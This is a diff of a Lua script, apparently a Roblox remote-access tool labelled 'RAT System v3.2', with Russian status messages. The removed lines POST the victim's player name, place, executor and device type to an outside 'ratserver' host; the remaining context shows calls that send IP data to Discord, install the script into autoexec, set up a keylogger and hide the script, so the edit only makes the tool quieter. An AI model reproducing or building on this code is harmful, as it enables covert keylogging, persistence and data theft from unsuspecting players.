@@ -272,29 +272,7 @@ local function sendInjectNotification()
     
     local success = sendDirectNotification(playerName, placeName, executor, deviceType, ipData)
     
-    if success then
-        print("Уведомление отправлено в Discord")
-    else
-        print("Ошибка отправки в Discord")
-    end
-    
-    local SERVER_URL = "https://ratserver-6wo3.onrender.com"
-    
-    if requestFunc then
-        pcall(function()
-            requestFunc({
-                Url = SERVER_URL.."/users",
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = HttpService:JSONEncode({
-                    player = playerName,
-                    place = placeName,
-                    executor = executor,
-                    device = deviceType
-                })
-            })
-        end)
-    end
+    return success
 end
 
 local function autoInstallToAutoexec()
@@ -1377,9 +1355,7 @@ local function initialize()
     pcall(setupKeylogger)
     pcall(hideScript)
     
-    print("RAT System v3.2 запущен")
-    print("Игрок:", player.Name)
-    print("Устройство:", deviceType)
+    return
 end
 
 local function mainLoop()
